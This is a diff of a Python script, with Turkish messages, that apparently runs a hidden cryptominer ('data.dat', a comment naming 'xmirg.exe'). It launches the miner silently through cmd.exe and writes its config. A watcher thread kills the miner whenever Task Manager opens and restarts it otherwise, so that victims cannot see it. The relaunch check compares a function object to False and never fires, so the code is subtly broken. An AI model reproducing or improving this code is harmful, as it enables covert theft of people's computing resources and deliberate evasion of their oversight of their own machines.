@@ -138,11 +138,7 @@ def enject():
 def start():
     with open("config.json","w") as config:
         config.write(jsonfiledata)
-    subprocess.Popen(
-    ["cmd.exe", "/c", "start", "/B", "data.dat"],
-    stdout=subprocess.DEVNULL,
-    stderr=subprocess.DEVNULL,
-)
+    subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,)
     
     try:
         with open("chcekdata","r") as f:
@@ -157,9 +153,8 @@ def start():
     
         
 
-def append():
+def kill():
     for process in psutil.process_iter(attrs=['pid', 'name']):
-        # Eğer süreç xmirg.exe ise
         if process.info['name'].lower() == 'data.dat':
             print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
             process.terminate()  # Programı sonlandır
@@ -168,12 +163,14 @@ def append():
             return True
     print("xmirg.exe bulunamadı.")
     return False
+
 def ifapp():
     for process in psutil.process_iter(attrs=['pid', 'name']):
         if process.info['name'].lower() == 'data.dat':
             return True
     return False
 
+    
 
 def is_task_manager_open():
     for process in psutil.process_iter(attrs=['name']):
@@ -185,16 +182,14 @@ def task_manager_watcher():
     while True:
         if is_task_manager_open():
             print("Görev Yöneticisi Açıldı!")
-            append()
+            kill()
         elif ifapp == False:
-            start()
+            subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,)
         time.sleep(1)
           
 
 
 
-watcher_thread = threading.Thread(target=task_manager_watcher, daemon=True)
-watcher_thread.start()
+task = threading.Thread(target=task_manager_watcher, daemon=True)
+task.start()
 start()
-while True:
-    print("program started...")
